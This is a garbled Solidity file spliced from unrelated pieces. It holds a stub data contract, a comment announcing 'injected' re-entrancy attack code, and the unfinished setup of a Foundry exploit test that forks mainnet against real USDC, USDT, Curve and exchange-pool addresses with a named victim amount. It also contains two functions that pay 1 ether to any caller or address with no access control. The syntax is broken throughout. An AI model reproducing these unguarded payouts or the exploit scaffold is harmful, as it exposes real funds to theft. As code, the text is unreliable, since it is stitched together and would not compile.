
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

/* Injected code for re-entrancy attack */;
/*
*/;

;
;
interface IExchangeBetweenPools {
    function doExchange(uint256 amounts) external returns(bool)};
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IExchangeBetweenPools ExchangeBetweenPools = IExchangeBetweenPools(0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D);
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    uint256 victimAmount = 119023523157;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 17376906);
        cheats.label(address(USDC), "USDC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(ExchangeBetweenPools), "ExchangeBetweenPools");
        cheats.label(address(curveYSwap), "curveYSwap");
function unguardedWithdraw() public {
    (bool sent, ) = msg.sender.call{value: 1 ether}("");
    require(sent)}
function blindTransfer(address payable to) public {
    require(to.send(1 ether))}